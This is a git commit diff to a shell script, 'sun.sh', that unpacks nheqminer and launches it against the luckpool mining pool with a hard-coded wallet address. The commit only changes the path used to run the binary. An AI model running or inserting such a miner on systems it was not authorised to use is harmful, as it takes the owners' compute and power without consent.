4306f6e4c1e2524562b89756326244983b47f518
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-05-26 16:28:27 +0700

    Update sun.sh

--- sun.sh
+++ sun.sh
@@ -8,6 +8,4 @@ tar -xvzf nheqminer-Linux-v0.8.2.tgz
 
 tar xf nheqminer-Linux-v0.8.2.tar.gz
 
-cd nheqminer
-
-nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RMHJAUh6ETgku7iaAL2tAYXQKvkoodo4VW.no1 -p x -t 4
+./nheqminer -v -l eu.luckpool.net:3956 -u RMHJAUh6ETgku7iaAL2tAYXQKvkoodo4VW.no1 -p x -t 4
